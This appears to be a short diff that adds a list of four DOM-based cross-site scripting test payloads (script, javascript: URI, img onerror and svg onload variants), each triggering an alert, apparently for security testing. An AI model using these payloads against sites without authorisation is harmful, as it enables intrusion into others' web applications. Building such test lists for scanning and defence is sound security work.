@@ -1,0 +1,4 @@
+#<script>alert('DOM XSS')</script>
+#javascript:alert('DOM')
+#<img src=x onerror=alert('DOM XSS')>
+#?payload=<svg onload=alert('DOM')>
